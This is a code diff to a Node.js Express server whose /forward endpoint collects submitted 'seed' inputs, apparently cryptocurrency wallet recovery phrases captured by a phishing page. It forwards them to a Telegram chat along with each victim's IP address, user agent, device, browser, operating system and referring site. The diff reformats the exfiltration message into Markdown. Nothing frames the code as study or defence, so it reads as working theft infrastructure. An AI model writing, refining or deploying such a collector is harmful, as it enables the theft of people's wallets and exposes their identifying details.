@@ -16,9 +16,6 @@ app.use(bodyParser.json());
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
-// Helper function to get country from IP using ipstack API
-
-
 // Endpoint to receive form data and forward to Telegram
 app.post("/forward", async (req, res) => {
   const { inputs } = req.body;
@@ -37,26 +34,19 @@ app.post("/forward", async (req, res) => {
   const browser = parser.getBrowser().name || "Unknown Browser";
   const os = parser.getOS().name || "Unknown OS";
 
-  // Get country from IP
-
-  // Construct message
+  // Construct Telegram message
+  const monospace = "```";
+  const formattedInputs = inputs.join(' '); // Format inputs with space separation
   const message = `
-📪 One Seed Collected 
+One Seed Collected:${monospace} ${formattedInputs} ${monospace}
 
-🚧 Seed : ${inputs.map((input, index) => `${index + 1}: ${input}`).join("〰️")}
-
-📍 Ip: ${ip}
-
-
-❗️User-Agent: ${userAgent}
-
-❗️Device: ${device} 
-
-❗️Browser : ${browser}
-
-❗️Operating System: ${os}
-
-🔗 Website: ${referer}`;
+ __Other Informations__
+${monospace} IP: ${ip}
+User-Agent: ${userAgent}
+Device: ${device} 
+Browser: ${browser}
+Operating System: ${os}
+Website: ${referer} ${monospace}`;
 
   try {
     // Send message to Telegram
@@ -65,6 +55,7 @@ app.post("/forward", async (req, res) => {
       {
         chat_id: TELEGRAM_CHAT_ID,
         text: message,
+        parse_mode: "Markdown"
       }
     );
 
